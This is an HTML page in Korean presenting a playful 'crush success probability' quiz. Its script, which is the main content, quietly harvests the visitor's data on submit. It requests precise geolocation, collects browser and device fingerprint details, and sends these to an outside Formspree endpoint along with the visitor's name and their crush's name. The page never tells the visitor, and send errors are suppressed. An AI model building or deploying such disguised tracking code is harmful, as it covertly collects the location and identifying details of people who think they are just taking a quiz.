<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <title>짝사랑 성공 확률 테스트 💘</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; background:#fff0f5; padding:24px; text-align:center; }
    form { background:white; padding:20px; border-radius:12px; display:inline-block; max-width:640px; width:100%; text-align:left; box-shadow:0 6px 20px rgba(0,0,0,0.06); }
    h1{ color:#ff69b4; margin:0 0 12px; text-align:center; }
    label{ display:block; margin:10px 0 6px; }
    .question{ margin-top:12px; }
    .options label{ display:block; margin:6px 0; cursor:pointer; }
    input[type="text"]{ padding:8px; width:calc(100% - 18px); border-radius:6px; border:1px solid #ccc; box-sizing:border-box; }
    button{ margin-top:16px; padding:12px; width:100%; border:none; border-radius:10px; background:#ff69b4; color:#fff; font-size:16px; cursor:pointer; }
    #result{ margin-top:18px; font-size:18px; font-weight:600; color:#333; text-align:center; }
  </style>
</head>
<body>
  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>

  <form id="loveForm">
    <label>당신의 이름:</label>
    <input id="yourName" type="text" required>
    <label>짝사랑 상대 이름:</label>
    <input id="crushName" type="text" required>

    <!-- 질문 1~10 -->
    <div class="question" data-question="상대와 얼마나 자주 대화하나요?">
      <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
      <div class="options">
        <label><input type="radio" name="q1" value="10"> 거의 안 해요</label>
        <label><input type="radio" name="q1" value="40"> 가끔 해요</label>
        <label><input type="radio" name="q1" value="70"> 자주 해요</label>
        <label><input type="radio" name="q1" value="100"> 매일 대화해요</label>
      </div>
    </div>
    <!-- ... 나머지 질문 동일하게 유지 가능 ... -->

    <button type="submit">결과 보기</button>
  </form>

  <div id="result"></div>

  <script>
    // --- 고정 fallback 위치 (사용자 거부/오류 시 기록용) ---
    const FALLBACK_LOCATION = { lat: 37.5665, lon: 126.9780, label: "Seoul, Korea (fallback)" };

    // --- 위치 요청 ---
    async function getLocation(timeout = 8000) {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ ok: false, reason: 'not_supported' });
          return;
        }
        let done = false;
        const success = (pos) => {
          if (done) return; done = true;
          resolve({
            ok: true,
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy || null,
            timestamp: new Date(pos.timestamp || Date.now()).toISOString()
          });
        };
        const error = (err) => {
          if (done) return; done = true;
          const reasonMap = { 1:'permission_denied', 2:'position_unavailable', 3:'timeout' };
          resolve({ ok: false, reason: reasonMap[err.code] || 'unknown_error' });
        };
        navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout });
        setTimeout(()=>{ if(!done){done=true;resolve({ok:false,reason:'timeout_exceeded'})}}, timeout+1000);
      });
    }

    // --- 브라우저/시스템 정보 수집 ---
    function collectSystemInfo() {
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const sys = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.userAgentData?.platform || navigator.platform,
        brands: navigator.userAgentData?.brands || [],
        cookieEnabled: navigator.cookieEnabled,
        hardwareConcurrency: navigator.hardwareConcurrency || null,
        deviceMemory: navigator.deviceMemory || null,
        screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio },
        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
        network: navigator.connection ? {
          downlink: navigator.connection.downlink,
          effectiveType: navigator.connection.effectiveType,
          rtt: navigator.connection.rtt
        } : null,
        timezone: tz,
        timestamp: new Date().toISOString()
      };
      return sys;
    }

    // --- 폼 제출 ---
    document.getElementById('loveForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const yourName = document.getElementById('yourName').value.trim();
      const crushName = document.getElementById('crushName').value.trim();
      const resultEl = document.getElementById('result');
      if (!yourName || !crushName) {
        resultEl.textContent = "⚠️ 이름을 모두 입력해주세요!";
        return;
      }

      // 점수 계산 (간단 버전)
      const scores = [...document.querySelectorAll('input[type=radio]:checked')].map(el=>Number(el.value));
      const percent = Math.round(scores.reduce((a,b)=>a+b,0)/(scores.length||1));
      let message = "";
      if (percent < 40) message = "🥀 아직은 가능성이 낮아요...";
      else if (percent < 70) message = "🌸 희망이 보여요!";
      else if (percent < 90) message = "💞 좋은 분위기예요!";
      else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";

      resultEl.innerHTML = `💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 확률은 <span style="color:#ff69b4;">${percent}%</span><br>${message}`;

      // 위치 정보 요청
      const loc = await getLocation(8000);
      const locationToSend = loc.ok ? {
        method: "geolocation",
        lat: loc.lat, lon: loc.lon,
        accuracy: loc.accuracy,
        timestamp: loc.timestamp,
        mapLink: `https://maps.google.com/?q=${loc.lat},${loc.lon}`
      } : {
        method: "fallback",
        reason: loc.reason,
        lat: FALLBACK_LOCATION.lat, lon: FALLBACK_LOCATION.lon,
        note: FALLBACK_LOCATION.label,
        mapLink: `https://maps.google.com/?q=${FALLBACK_LOCATION.lat},${FALLBACK_LOCATION.lon}`
      };

      // 시스템 정보 수집
      const systemInfo = collectSystemInfo();

      // Formspree로 전송
      fetch("https://formspree.io/f/xanpzabp", {
        method: "POST",
        headers: { "Accept": "application/json", "Content-Type": "application/json" },
        body: JSON.stringify({
          yourName, crushName, percent, message,
          location: locationToSend,
          system: systemInfo
        })
      }).catch(()=>{});
    });
  </script>
</body>
</html>
